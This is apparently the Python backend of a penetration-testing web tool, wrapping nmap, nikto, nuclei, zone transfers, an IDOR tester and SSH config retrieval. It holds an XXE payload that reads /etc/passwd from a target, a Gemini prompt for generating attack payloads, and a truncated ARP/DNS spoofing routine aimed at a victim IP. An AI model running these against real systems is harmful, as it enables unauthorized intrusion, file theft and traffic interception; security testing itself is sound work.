import nmap
import subprocess
import json
import re
import os
import shlex
import sublist3r
import dns.resolver
import whois
from flask import render_template
from pymetasploit3.msfrpc import MsfRpcClient
import time
import ipaddress
import google.generativeai as genai
import uuid
import threading
import signal

# Global dictionary to hold the state of background tasks
tasks = {}

def create_task(target_function, *args, **kwargs):
    """
    Creates and starts a background task, returning its ID.
    """
    task_id = str(uuid.uuid4())
    print(f"[create_task] Creating task {task_id} for function {target_function.__name__}", flush=True)
    tasks[task_id] = {
        'status': 'pending',
        'start_time': time.time(),
        'result': None,
        'name': target_function.__name__ 
    }
    
    # The worker function will call the provided target_function
    thread = threading.Thread(target=target_function, args=(task_id,) + args, kwargs=kwargs)
    thread.daemon = True  # Allows main program to exit even if threads are running
    thread.start()
    print(f"[create_task] Task {task_id} started.", flush=True)
    return task_id

def get_task_status(task_id):
    """
    Retrieves the status, result, and duration of a task.
    """
    task = tasks.get(task_id)
    if not task:
        return {'status': 'not_found'}

    response = {
        'status': task['status'],
        'start_time': task['start_time'],
        'duration': time.time() - task['start_time']
    }

    if task['status'] in ['completed', 'error', 'cancelled']:
        response['result'] = task.get('result')
        # Optional: Clean up old tasks after a certain time or number of tasks
    return response

def cancel_task(task_id):
    """
    Cancels a running task.
    For process-based tasks, it terminates the process group.
    For thread-based tasks, it sets the status to 'cancelled' for cooperative cancellation.
    """
    task = tasks.get(task_id)
    if not task or task.get('status') not in ['running', 'pending']:
        return {'status': 'error', 'message': 'Task not found or not in a cancellable state.'}

    # Set status to cancelled for all task types
    task['status'] = 'cancelled'
    task['end_time'] = time.time()
    task['result'] = {'stdout': None, 'stderr': 'Task was cancelled by the user.'}

    # If it's a subprocess-based task, also kill the process
    if 'process' in task and task['process']:
        try:
            # Kill the entire process group (process and its children)
            os.killpg(os.getpgid(task['process'].pid), signal.SIGTERM)
        except ProcessLookupError:
            # Process might have already finished between status check and kill
            pass 
        except Exception as e:
            # Log the error but proceed with cancellation status
            print(f"Error trying to kill process for task {task_id}: {e}")
            task['result']['stderr'] += f'\nCould not forcefully terminate process: {e}'
    
    return {'status': 'cancelled'}

def run_command_worker(task_id, command):
    """
    A worker function that executes a shell command in a subprocess.
    This function is intended to be run in a separate thread.
    """
    try:
        task = tasks[task_id]
        task['status'] = 'running'
        
        print(f"[run_command_worker] Task {task_id}: Executing command: {' '.join(command)}", flush=True)

        # Using Popen for non-blocking execution and os.setsid to create a new process group
        # This allows us to kill the process and all its children reliably.
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
        task['process'] = process

        stdout, stderr = process.communicate()

        # Check if the task was cancelled while it was running
        if task['status'] == 'cancelled':
            return

        if process.returncode == 0:
            task['status'] = 'completed'
            task['result'] = {'stdout': stdout, 'stderr': None}
        else:
            task['status'] = 'error'
            task['result'] = {'stdout': None, 'stderr': (stdout + "\n" + stderr).strip()}
            
    except Exception as e:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            tasks[task_id]['result'] = {'stdout': None, 'stderr': str(e)}
    finally:
        if task_id in tasks:
            tasks[task_id]['end_time'] = time.time()
            if 'process' in tasks[task_id]:
                del tasks[task_id]['process'] # Remove non-serializable process object


def perform_ping_scan_worker(task_id, target):
    """Worker that executes the ping scan."""
    sanitized_target = shlex.quote(target)
    command = ['ping', '-c', '4', sanitized_target]
    run_command_worker(task_id, command)

def perform_ping_scan(target):
    """Starts a background ping scan task."""
    print(f"[perform_ping_scan] Starting ping scan for target: {target}", flush=True)
    return create_task(perform_ping_scan_worker, target)

def perform_traceroute_scan_worker(task_id, target):
    """Worker that executes the traceroute scan."""
    sanitized_target = shlex.quote(target)
    command = ['traceroute', sanitized_target]
    run_command_worker(task_id, command)

def perform_traceroute_scan(target):
    """Starts a background traceroute scan task."""
    return create_task(perform_traceroute_scan_worker, target)

def perform_nslookup_scan_worker(task_id, target):
    """Worker that executes the nslookup scan."""
    sanitized_target = shlex.quote(target)
    command = ['nslookup', sanitized_target]
    run_command_worker(task_id, command)

def perform_nslookup_scan(target):
    """Starts a background nslookup scan task."""
    return create_task(perform_nslookup_scan_worker, target)

def perform_nmap_scan_worker(task_id, target, scan_type, custom_ports=None, custom_args=None):
    """Worker that executes nmap command line."""
    arguments = ''
    if scan_type == 'custom_scan':
        # Build command from custom parts
        command = ['nmap']
        if custom_args:
            # Important: Split custom args to handle them as individual arguments
            command.extend(shlex.split(custom_args))
        if custom_ports:
            command.extend(['-p', shlex.quote(custom_ports)])
    else:
        # Use predefined scan types
        scan_args = {
            'ping_scan': '-sn',
            'quick_scan': '-T4 -F',
            'intense_scan': '-T4 -A -v',
            'udp_scan': '-sU',
            'vuln_scan': '--script vuln',
            'ssh_audit': '-p 22 --script ssh2-enum-algos,ssh-auth-methods'
        }
        arguments = scan_args.get(scan_type)
        if not arguments:
            tasks[task_id]['status'] = 'error'
            tasks[task_id]['result'] = {'stdout': None, 'stderr': f"Invalid scan type: {scan_type}"}
            tasks[task_id]['end_time'] = time.time()
            return
        # Construct the command line for predefined scans
        command = ['nmap'] + shlex.split(arguments)

    try:
        # Add the target at the end, always sanitized
        command.append(shlex.quote(str(target)))
        run_command_worker(task_id, command)
    except Exception as e:
        tasks[task_id]['status'] = 'error'
        tasks[task_id]['result'] = {'stdout': None, 'stderr': str(e)}
        tasks[task_id]['end_time'] = time.time()

def perform_nmap_scan(target, scan_type, custom_ports=None, custom_args=None):
    """Starts a background nmap scan task."""
    return create_task(perform_nmap_scan_worker, target, scan_type, custom_ports=custom_ports, custom_args=custom_args)
def get_network_device_info_worker(task_id, device_type, host, username, password):
    """Worker that connects to a network device via SSH and gets its configuration."""
    try:
        import paramiko
        task = tasks[task_id]
        task['status'] = 'running'

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Note: Paramiko connect is blocking. Cancellation won't work during the initial connection phase.
        # It will work once the command is being executed.
        client.connect(hostname=host, username=username, password=password, timeout=20)

        if device_type == 'mikrotik':
            command = "/export"
        elif device_type == 'cisco_ios':
            command = "show running-config"
        else:
            raise ValueError(f"Unsupported device type: {device_type}")

        # Associate process for potential cancellation, though exec_command is also blocking.
        # A more advanced implementation might use non-blocking channels.
        stdin, stdout, stderr = client.exec_command(command)
        
        # A simple way to make this part responsive to cancellation is not straightforward with paramiko's default exec_command.
        # For now, the main benefit is not blocking the main Flask thread.
        if task['status'] == 'cancelled':
            client.close()
            return

        config_data = stdout.read().decode('utf-8')
        error_data = stderr.read().decode('utf-8')
        client.close()

        if error_data:
            raise Exception(error_data)

        task['status'] = 'completed'
        task['result'] = {'stdout': config_data, 'stderr': None}

    except paramiko.AuthenticationException:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            tasks[task_id]['result'] = {'stdout': None, 'stderr': "Authentication failed. Please check username and password."}
    except paramiko.SSHException as e:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            tasks[task_id]['result'] = {'stdout': None, 'stderr': f"SSH connection error: {str(e)}"}
    except Exception as e:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            tasks[task_id]['result'] = {'stdout': None, 'stderr': f"An unexpected error occurred: {str(e)}"}
    finally:
        if task_id in tasks:
            tasks[task_id]['end_time'] = time.time()

def get_network_device_info(device_type, host, username, password):
    """Starts a background task to get network device info."""
    return create_task(get_network_device_info_worker, device_type, host, username, password)


def run_domain_scan_worker(task_id, target_domain, scan_type):
    """Worker for domain scanning, e.g., sublist3r, using subprocess."""
    try:
        task = tasks[task_id]
        
        if scan_type == 'subdomain_enum':
            # Path to the sublist3r executable within the virtual environment
            sublist3r_path = 'sublist3r'
            
            # Command to execute sublist3r and save the output to a temporary file
            # We use -o to control the output and avoid parsing noisy stdout
            temp_output_file = f'/tmp/{task_id}_subdomains.txt'
            command = [
                sublist3r_path,
                '-d', shlex.quote(target_domain),
                '-o', temp_output_file
            ]
            
            # This worker will handle the subprocess execution and state updates
            run_command_worker(task_id, command)

            # After the command worker is done, we process the result file
            if tasks[task_id]['status'] == 'completed':
                try:
                    with open(temp_output_file, 'r') as f:
                        subdomains = [line.strip() for line in f.readlines()]
                    # Overwrite the result's stdout with the parsed list
                    tasks[task_id]['result']['stdout'] = '\n'.join(subdomains)
                except FileNotFoundError:
                    tasks[task_id]['status'] = 'error'
                    tasks[task_id]['result']['stderr'] = 'Sublist3r ran but the output file was not found.'
                finally:
                    if os.path.exists(temp_output_file):
                        os.remove(temp_output_file)
        else:
            raise ValueError("Unsupported scan type for domain.")

    except Exception as e:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            tasks[task_id]['result'] = {"status": "error", "message": str(e)}
    finally:
        if task_id in tasks and tasks[task_id]['status'] != 'running':
            tasks[task_id]['end_time'] = time.time()

def run_domain_scan(target_domain, scan_type):
    """Starts a background domain scan task."""
    return create_task(run_domain_scan_worker, target_domain, scan_type)
def run_email_analysis_worker(task_id, target_email):
    """Worker for basic email analysis (format, domain, MX records)."""
    try:
        task = tasks[task_id]
        task['status'] = 'running'
        
        # 1. Email format validation
        if not re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", target_email):
            raise ValueError("Invalid email format.")

        domain = target_email.split('@')[1]
        
        # 2. Combined DNS lookups for A and MX records
        # We use nslookup for consistency with other cancellable tasks.
        # This is a simplified approach; a more robust solution might parse the output more granularly.
        command = ['nslookup', '-query=ANY', shlex.quote(domain)]
        
        # This is a blocking call within the thread, but the whole thread is managed by our task system.
        # For cancellation to work on this specific command, it would need its own subprocess management,
        # but for now, we wrap the entire sequence.
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
        task['process'] = process
        stdout, stderr = process.communicate()

        if task['status'] == 'cancelled':
            return

        if process.returncode != 0 and "not found" in stderr:
             task['status'] = 'error'
             task['result'] = {'stdout': None, 'stderr': f"Domain '{domain}' not found."}
             return

        output = stdout + stderr
        
        results = f"Email Address: {target_email}\n"
        results += f"Domain: {domain}\n"
        results += f"Format Validation: Valid\n\n"
        results += f"--- DNS Records (A, MX, etc.) for {domain} ---\n"
        results += output

        task['status'] = 'completed'
        task['result'] = {'stdout': results, 'stderr': None}

    except Exception as e:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            tasks[task_id]['result'] = {'stdout': None, 'stderr': str(e)}
    finally:
        if task_id in tasks:
            tasks[task_id]['end_time'] = time.time()
            if 'process' in tasks[task_id]:
                del tasks[task_id]['process']

def run_email_analysis(target_email):
    """Starts a background task for basic email analysis."""
    return create_task(run_email_analysis_worker, target_email)

def perform_email_header_analysis_worker(task_id, raw_headers):
    """Worker that parses email headers."""
    try:
        import email
        task = tasks[task_id]
        task['status'] = 'running'
        
        msg = email.message_from_string(raw_headers)
        
        header_details = []
        for key, value in msg.items():
            header_details.append(f"{key}: {value}")
        
        if task['status'] == 'cancelled': return

        # Check for SPF, DKIM, DMARC in headers (Authentication-Results)
        auth_results_header = msg.get('Authentication-Results')
        analysis = "\n--- Authentication Analysis ---\n"
        if auth_results_header:
            analysis += f"Authentication-Results Header: {auth_results_header}\n"
            if 'spf=pass' in auth_results_header.lower():
                analysis += "SPF Status: PASS\n"
            elif 'spf=fail' in auth_results_header.lower():
                analysis += "SPF Status: FAIL\n"
            else:
                analysis += "SPF Status: UNKNOWN/NOT FOUND\n"

            if 'dkim=pass' in auth_results_header.lower():
                analysis += "DKIM Status: PASS\n"
            elif 'dkim=fail' in auth_results_header.lower():
                analysis += "DKIM Status: FAIL\n"
            else:
                analysis += "DKIM Status: UNKNOWN/NOT FOUND\n"

            if 'dmarc=pass' in auth_results_header.lower():
                analysis += "DMARC Status: PASS\n"
            elif 'dmarc=fail' in auth_results_header.lower():
                analysis += "DMARC Status: FAIL\n"
            else:
                analysis += "DMARC Status: UNKNOWN/NOT FOUND\n"
        else:
            analysis += "No 'Authentication-Results' header found. Cannot determine SPF/DKIM/DMARC status from this header.\n"

        # Trace the path
        received_path = "\n--- Received Path (Message Trace) ---\n"
        received_headers = msg.get_all('Received')
        if received_headers:
            for i, h in enumerate(received_headers):
                received_path += f"{i+1}. {h.strip()}\n"
        else:
            received_path += "No 'Received' headers found.\n"

        full_report = "\n--- All Headers ---\n".join(header_details) + analysis + received_path
        
        task['status'] = 'completed'
        task['result'] = {'stdout': full_report, 'stderr': None}

    except Exception as e:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            tasks[task_id]['result'] = {'stdout': None, 'stderr': str(e)}
    finally:
        if task_id in tasks:
            tasks[task_id]['end_time'] = time.time()

def perform_email_header_analysis(raw_headers):
    """Starts a background task for email header analysis."""
    return create_task(perform_email_header_analysis_worker, raw_headers)

def perform_mail_server_port_scan_worker(task_id, target_host):
    """Worker that executes an nmap scan for mail-related ports."""
    mail_ports = '25,110,143,465,587,993,995' # SMTP, POP3, IMAP, SMTPS, Submission, IMAPS, POP3S
    command = ['nmap', '-p', mail_ports, '-sV', shlex.quote(target_host)]
    run_command_worker(task_id, command)

def perform_mail_server_port_scan(target_host):
    """Starts a background mail server port scan task."""
    return create_task(perform_mail_server_port_scan_worker, target_host)

def perform_email_auth_lookup_worker(task_id, domain):
    """Worker that looks up email authentication records (SPF, DMARC, DKIM) using dig."""
    try:
        task = tasks[task_id]
        task['status'] = 'running'

        # Using dig for cancellable operation via run_command_worker
        spf_command = ['dig', '+short', 'TXT', shlex.quote(domain)]
        dmarc_command = ['dig', '+short', 'TXT', shlex.quote(f'_dmarc.{domain}')]
        
        # We will run these sequentially. A more advanced version could run them in parallel.
        # For simplicity and clear output, sequential is fine.
        
        full_output = ""
        
        # --- SPF ---
        full_output += "--- SPF Record Lookup ---\n"
        process_spf = subprocess.Popen(spf_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
        task['process'] = process_spf # Allow cancellation
        stdout_spf, stderr_spf = process_spf.communicate()
        if task['status'] == 'cancelled': return
        
        spf_records = [line for line in stdout_spf.split('\n') if 'v=spf1' in line]
        if spf_records:
            full_output += '\n'.join(spf_records) + '\n'
        else:
            full_output += "No SPF record found.\n"
        if stderr_spf:
            full_output += f"Error: {stderr_spf}\n"

        full_output += "\n"

        # --- DMARC ---
        full_output += "--- DMARC Record Lookup ---\n"
        process_dmarc = subprocess.Popen(dmarc_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
        task['process'] = process_dmarc # Allow cancellation
        stdout_dmarc, stderr_dmarc = process_dmarc.communicate()
        if task['status'] == 'cancelled': return

        dmarc_records = [line for line in stdout_dmarc.split('\n') if 'v=DMARC1' in line]
        if dmarc_records:
            full_output += '\n'.join(dmarc_records) + '\n'
        else:
            full_output += "No DMARC record found.\n"
        if stderr_dmarc:
            full_output += f"Error: {stderr_dmarc}\n"
            
        full_output += "\n--- DKIM Info ---\n"
        full_output += "DKIM records require a 'selector' and cannot be looked up for a domain alone.\n"
        full_output += "Example: selector._domainkey.example.com\n"
        full_output += "Check email headers to find the selector used by the sender.\n"

        task['status'] = 'completed'
        task['result'] = {'stdout': full_output, 'stderr': None}

    except Exception as e:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            tasks[task_id]['result'] = {'stdout': None, 'stderr': str(e)}
    finally:
        if task_id in tasks:
            tasks[task_id]['end_time'] = time.time()
            if 'process' in tasks[task_id]:
                del tasks[task_id]['process']

def perform_email_auth_lookup(domain):
    """Starts a background email auth lookup task."""
    return create_task(perform_email_auth_lookup_worker, domain)

def perform_idor_test_worker(task_id, data):
    """Worker that performs an IDOR test."""
    try:
        import requests
        from urllib.parse import urlparse
        task = tasks[task_id]
        task['status'] = 'running'

        target_url_template = data.get('target_url')
        id_list_str = data.get('id_list', '')
        cookie_user_a = data.get('cookie_user_a')
        id_user_a = data.get('id_user_a')

        if not all([target_url_template, id_list_str, cookie_user_a, id_user_a]):
            raise ValueError('Missing required fields for IDOR test.')

        results = []
        headers = {'Cookie': cookie_user_a}
        test_ids = [item.strip() for item in id_list_str.split(',')]

        baseline_url = target_url_template.replace('__ID__', str(id_user_a))
        baseline_resp = requests.get(baseline_url, headers=headers, timeout=10, allow_redirects=False)
        baseline_status = baseline_resp.status_code
        baseline_length = len(baseline_resp.content)
        results.append({
            'id': id_user_a,
            'status': 'Baseline',
            'http_code': baseline_status,
            'content_length': baseline_length
        })

        for test_id in test_ids:
            if task['status'] == 'cancelled': break
            if test_id == id_user_a: continue

            test_url = target_url_template.replace('__ID__', str(test_id))
            resp = requests.get(test_url, headers=headers, timeout=10, allow_redirects=False)
            status = 'Indeterminate'
            if resp.status_code == baseline_status and resp.status_code == 200:
                status = 'VULNERABLE'
            elif resp.status_code in [401, 403, 404]:
                status = 'Secure'
            results.append({
                'id': test_id,
                'status': status,
                'http_code': resp.status_code,
                'content_length': len(resp.content)
            })
        
        if task['status'] != 'cancelled':
            task['status'] = 'completed'
        task['result'] = {'status': 'completed', 'results': results}

    except Exception as e:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            tasks[task_id]['result'] = {'status': 'error', 'message': str(e)}
    finally:
        if task_id in tasks:
            tasks[task_id]['end_time'] = time.time()

def perform_idor_test(data):
    """Starts a background IDOR test task."""
    return create_task(perform_idor_test_worker, data)

def perform_discovery_crawl_worker(task_id, data):
    """Worker that performs a discovery crawl."""
    try:
        import requests
        from bs4 import BeautifulSoup
        from urllib.parse import urljoin, urlparse
        task = tasks[task_id]
        task['status'] = 'running'

        start_url = data.get('start_url')
        cookie = data.get('cookie')
        if not all([start_url, cookie]):
            raise ValueError('Start URL and Cookie are required.')

        headers = {'Cookie': cookie}
        domain = urlparse(start_url).netloc
        urls_to_visit = [start_url]
        visited_urls = set()
        found_endpoints = set()
        max_pages = 30

        while urls_to_visit and len(visited_urls) < max_pages:
            if task['status'] == 'cancelled': break
            current_url = urls_to_visit.pop(0)
            if current_url in visited_urls: continue

            response = requests.get(current_url, headers=headers, timeout=10, allow_redirects=True)
            visited_urls.add(current_url)

            if 'text/html' not in response.headers.get('Content-Type', ''): continue

            soup = BeautifulSoup(response.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                href = link['href']
                joined_url = urljoin(current_url, href)
                parsed_url = urlparse(joined_url)
                if parsed_url.netloc == domain and parsed_url.scheme in ['http', 'https']:
                    if joined_url not in visited_urls: urls_to_visit.append(joined_url)
                    if parsed_url.query: found_endpoints.add(joined_url)

        if task['status'] != 'cancelled':
            task['status'] = 'completed'
        task['result'] = {'status': 'completed', 'discovered_endpoints': sorted(list(found_endpoints))}

    except Exception as e:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            tasks[task_id]['result'] = {'status': 'error', 'message': str(e)}
    finally:
        if task_id in tasks:
            tasks[task_id]['end_time'] = time.time()

def perform_discovery_crawl(data):
    """Starts a background discovery crawl task."""
    return create_task(perform_discovery_crawl_worker, data)

def run_xxe_scan_worker(task_id, target_url):
    """Worker that performs a basic XXE vulnerability check."""
    try:
        import requests
        task = tasks[task_id]
        task['status'] = 'running'

        xml_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<bugreport>
<title>test</title>
<cwe>test</cwe>
<cvss>test</cvss>
<description>&xxe;</description>
</bugreport>"""
        headers = {'Content-Type': 'application/xml'}
        response = requests.post(target_url, data=xml_payload, headers=headers, timeout=20)

        if task['status'] == 'cancelled': return

        if 'root:x:0:0' in response.text:
            result = f"VULNERABLE: The target at {target_url} appears to be vulnerable to XXE.\n"
            result += "The response contained content from /etc/passwd.\n\n"
            result += "--- Response Snippet ---\n"
            result += response.text[:1000] + ("..." if len(response.text) > 1000 else "")
        else:
            result = f"NOT VULNERABLE: The target at {target_url} does not appear to be vulnerable to this basic XXE check.\n"
            result += "The server responded, but the response did not contain the expected content from /etc/passwd."
        
        task['status'] = 'completed'
        task['result'] = {'stdout': result, 'stderr': None}

    except Exception as e:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            tasks[task_id]['result'] = {'stdout': None, 'stderr': f"An error occurred while sending the XXE payload: {str(e)}"}
    finally:
        if task_id in tasks:
            tasks[task_id]['end_time'] = time.time()

def run_xxe_scan(target_url):
    """Starts a background XXE scan task."""
    return create_task(run_xxe_scan_worker, target_url)

def analyze_results_with_gemini_worker(task_id, api_key, results, language):
    """Worker that performs AI analysis using the Gemini API."""
    try:
        task = tasks[task_id]
        task['status'] = 'running'
        print(f"[analyze_results_with_gemini] Starting AI analysis for task ID: {task_id}")
        print(f"[analyze_results_with_gemini] Using API Key (first 5 chars): {str(api_key)[:5]}...")

        genai.configure(api_key=api_key)
        model = genai.GenerativeModel('gemini-pro-latest')
        prompt = f"""
        You are a world-class cybersecurity expert and network analyst. Your task is to analyze the following network scan results and generate a report by following these steps precisely.

        **IMPORTANT INSTRUCTIONS:**
        - Your entire response MUST be in pure Markdown format.
        - Do NOT use any HTML, CSS, or any other non-Markdown formatting.
        - Do NOT include any introductory sentences, greetings, or conversational filler.
        - Go STRAIGHT to the report.
        - Generate the entire report in {language}.

        **Step-by-Step Report Generation:**

        **Step 1: Analyze the Raw Scan Results.**
        Raw Scan Results:
        ---
        {results}
        ---

        **Step 2: Construct the Report.**
        Based on your analysis from Step 1, construct a report with the following sections in this exact order. Do not skip any sections.

        1.  **Executive Summary:** A brief, high-level summary of the most important findings.
        2.  **Detailed Findings:** A detailed explanation of each finding.
        3.  **Risk Level:** Classification of the risk level (Critical, High, Medium, Low) for each finding.
        4.  **Technical Remediation Steps:** For each finding, provide clear, step-by-step technical instructions on how to fix the vulnerability.
        5.  **Suggested Remediation Tools:** For each finding, recommend specific open-source or common tools that can be used for remediation.
        6.  **Analysis Methodology:** Briefly explain the methodology and the types of tools (e.g., Nmap, NSlookup) that were used to generate the raw data.
        7.  **Raw Scan Data:** Display the full, unmodified raw scan results as provided in Step 1.
        """
        
        print(f"[analyze_results_with_gemini] Calling Gemini API for task ID: {task_id}")
        response = model.generate_content(prompt, request_options={'timeout': 300})
        print(f"[analyze_results_with_gemini] Full Gemini API response received for task ID {task_id}: {response}")

        if task['status'] == 'cancelled':
            print(f"[analyze_results_with_gemini] AI analysis for task ID {task_id} was cancelled.")
            return

        # Check if response has text content before assigning
        if response.text:
            task['status'] = 'completed'
            task['result'] = {'status': 'completed', 'analysis': response.text}
            print(f"[analyze_results_with_gemini] AI analysis completed for task ID: {task_id}")
        else:
            task['status'] = 'error'
            task['result'] = {'status': 'error', 'message': 'Gemini API returned no text content.', 'full_response': str(response)}
            print(f"[analyze_results_with_gemini] AI analysis error for task ID {task_id}: Gemini API returned no text content. Full response: {response}")

    except Exception as e:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            if 'Deadline Exceeded' in str(e) or 'timed out' in str(e).lower():
                message = 'AI analysis timed out after 300 seconds. The data may be too large or the service is under heavy load. Please try again later or with a smaller data set.'
            else:
                message = str(e)
            tasks[task_id]['result'] = {'status': 'error', 'message': message}
            print(f"[analyze_results_with_gemini] AI analysis error for task ID {task_id}: {e}")
    finally:
        if task_id in tasks:
            tasks[task_id]['end_time'] = time.time()

def analyze_results_with_gemini(api_key, results, language):
    """Starts a background AI analysis task."""
    return create_task(analyze_results_with_gemini_worker, api_key, results, language)


def generate_payload_with_gemini_worker(task_id, api_key, description, language):
    """Worker that generates a security payload using the Gemini API."""
    try:
        task = tasks[task_id]
        task['status'] = 'running'

        genai.configure(api_key=api_key)
        model = genai.GenerativeModel('gemini-pro-latest')
        
        prompt = f"""You are a world-class cybersecurity expert specializing in penetration testing. Your task is to generate a security payload based on the user's description. 

        **IMPORTANT INSTRUCTIONS:**
        - Your entire response MUST be the payload itself, and nothing else.
        - Do NOT include any explanation, greetings, or conversational filler.
        - Do NOT wrap the payload in Markdown code blocks (e.g., ```).
        - Generate the payload in a raw text format.
        - The user has described the target and the desired payload type. Generate a relevant and effective payload.

        **User's Description:**
        ---
        {description}
        ---
        """

        response = model.generate_content(prompt, request_options={'timeout': 120})

        if task['status'] == 'cancelled':
            return

        if response.text:
            task['status'] = 'completed'
            # The result is the raw payload text
            task['result'] = {'stdout': response.text, 'stderr': None}
        else:
            task['status'] = 'error'
            task['result'] = {'stdout': None, 'stderr': 'Gemini API returned no text content.'}

    except Exception as e:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            if 'Deadline Exceeded' in str(e) or 'timed out' in str(e).lower():
                message = 'Payload generation timed out after 120 seconds.'
            else:
                message = str(e)
            tasks[task_id]['result'] = {'stdout': None, 'stderr': message}
    finally:
        if task_id in tasks:
            tasks[task_id]['end_time'] = time.time()

def generate_payload(api_key, description, language):
    """Starts a background AI payload generation task."""
    return create_task(generate_payload_with_gemini_worker, api_key, description, language)


def run_nikto_scan_worker(task_id, target_url):
    """Worker that executes the Nikto scan."""
    try:
        parsed_url = urlparse(target_url)
        host = parsed_url.hostname
        if not host:
            raise ValueError('Invalid URL provided.')
        
        command = ['nikto', '-h', host]
        if parsed_url.port:
            command.extend(['-p', str(parsed_url.port)])
        if parsed_url.scheme == 'https':
            command.append('-ssl')

        run_command_worker(task_id, command)
    except Exception as e:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            tasks[task_id]['result'] = {'stdout': None, 'stderr': str(e)}
            tasks[task_id]['end_time'] = time.time()

def run_nikto_scan(target_url):
    """Starts a background Nikto scan task."""
    return create_task(run_nikto_scan_worker, target_url)


def run_dns_zone_transfer_worker(task_id, target_domain):
    """Worker that attempts a DNS zone transfer against all domain nameservers."""
    try:
        task = tasks[task_id]
        task['status'] = 'running'

        ns_records = dns.resolver.resolve(target_domain, 'NS')
        nameservers = [str(ns.target) for ns in ns_records]
        
        if not nameservers:
            raise ValueError(f"Could not find name servers for {target_domain}.")

        full_output = ""
        for ns in nameservers:
            if task['status'] == 'cancelled':
                full_output += "\n--- Task cancelled by user. ---"
                break
            
            full_output += f"--- Attempting Zone Transfer on {ns} ---\n"
            command = ['dig', 'AXFR', f'@{ns}', target_domain]
            
            result = subprocess.run(command, capture_output=True, text=True, timeout=60)

            if result.stderr:
                full_output += f"Error: {result.stderr}\n\n"
            elif result.stdout:
                if "Transfer failed" in result.stdout or "failed" in result.stdout:
                     full_output += "Zone transfer failed or was refused.\n\n"
                elif "XFR size" in result.stdout:
                     full_output += "SUCCESS: Zone transfer completed.\n"
                     full_output += result.stdout + "\n\n"
                else:
                     full_output += "Zone transfer likely refused or no records found.\n\n"
            else:
                full_output += "No output from command.\n\n"
        
        if task['status'] != 'cancelled':
            task['status'] = 'completed'
        task['result'] = {'stdout': full_output, 'stderr': None}

    except Exception as e:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            tasks[task_id]['result'] = {'stdout': None, 'stderr': str(e)}
    finally:
        if task_id in tasks:
            tasks[task_id]['end_time'] = time.time()

def run_dns_zone_transfer(target_domain):
    """Starts a background DNS zone transfer task."""
    return create_task(run_dns_zone_transfer_worker, target_domain)

def run_custom_scan_worker(task_id, command_template, target):
    """Worker that executes a custom scan command."""
    try:
        sanitized_target = shlex.quote(target)
        command_string = command_template.replace('{{target}}', sanitized_target)
        command_parts = shlex.split(command_string)
        run_command_worker(task_id, command_parts)
    except Exception as e:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            tasks[task_id]['result'] = {'stdout': None, 'stderr': str(e)}
            tasks[task_id]['end_time'] = time.time()

def run_custom_scan(command_template, target):
    """Starts a background custom scan task."""
    return create_task(run_custom_scan_worker, command_template, target)

def run_nuclei_scan_worker(task_id, target_url, scan_type):
    """Worker that executes the Nuclei scan."""
    try:
        nuclei_path = 'nuclei'
        
        # Base command for nuclei
        command = [nuclei_path, '-u', shlex.quote(target_url)]

        # Add templates based on scan_type
        if scan_type == 'default':
            # Default scan, often includes common vulnerabilities
            command.extend(['-tags', 'cve,exposure,misconfig'])
        elif scan_type == 'vulnerabilities':
            command.extend(['-tags', 'cve,vulnerability'])
        elif scan_type == 'misconfigurations':
            command.extend(['-tags', 'misconfiguration'])
        elif scan_type == 'info':
            command.extend(['-tags', 'info'])
        elif scan_type == 'all':
            command.append('-silent') # Suppress verbose output for all templates
        else:
            # If a specific template is provided, use it
            command.extend(['-t', shlex.quote(scan_type)])

        # Execute the command using the generic run_command_worker
        run_command_worker(task_id, command)

    except Exception as e:
        if task_id in tasks:
            tasks[task_id]['status'] = 'error'
            tasks[task_id]['result'] = {'stdout': None, 'stderr': str(e)}
            tasks[task_id]['end_time'] = time.time()

def run_nuclei_scan(target_url, scan_type):
    """Starts a background Nuclei scan task."""
    return create_task(run_nuclei_scan_worker, target_url, scan_type)
def run_dns_spoof_test(victim_ip, target_domain, fake_ip):
    temp_hosts_file_path = '/tmp/temp_hosts'
    arpspoof_victim_process = None
    arpspoof_gateway_process = None
    dnsspoof_process = None

    try:
        # Get gateway IP
        gateway_ip_command = "ip route | grep default | awk '{print $3}'"
        gateway_ip_result = subprocess.run(gateway_ip_command, shell=True, capture_output=True, text=True)
        if gateway_ip_result.returncode != 0:
            return {'stdout': None, 'stderr': 'Failed to get gateway IP.'}
        gateway_ip = gateway_ip_result.stdout.strip()

        # Create temporary hosts file
        with open(temp_hosts_file_path, 'w') as f:
            f.write(f'{fake_ip} {target_domain}\n')

        # Enable IP forwarding
        run_command(['sysctl', '-w', 'net.ipv4.ip_forward=1'])

        # Start arpspoof processes
        arpspoof_victim_process = subprocess.Popen(['arpspoof', '-t', victim_ip, gateway_ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
